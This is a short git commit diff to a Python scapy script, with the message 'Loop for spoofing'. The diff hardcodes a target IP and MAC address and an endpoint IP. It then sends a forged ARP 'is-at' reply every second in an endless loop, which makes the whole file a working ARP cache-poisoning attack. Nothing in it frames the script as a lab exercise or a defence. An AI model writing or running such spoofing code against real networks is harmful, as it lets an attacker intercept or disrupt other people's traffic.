1d0a2f62d85af3ad1f33ca1a4b5306d4e4a6d575
TristanPinaudeau <tristan@flexfactory.fr>
2019-03-19 15:08:09 +0100

    Loop for spoofing

--- main.py
+++ main.py
@@ -1,7 +1,10 @@
 from scapy.all import *
+import time
 
-endpointIP = ""
-targetIP = ""
-targetMAC = ""
+endpointIP = "10.0.0.10"
+targetIP = "10.0.0.9"
+targetMAC = "14:dd:a9:91:1e:e2"
 
-sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
+while True:
+    sendp(Ether(dst=targetMAC)/ARP(op="is-at", psrc=endpointIP, pdst=targetIP))
+    time.sleep(1)
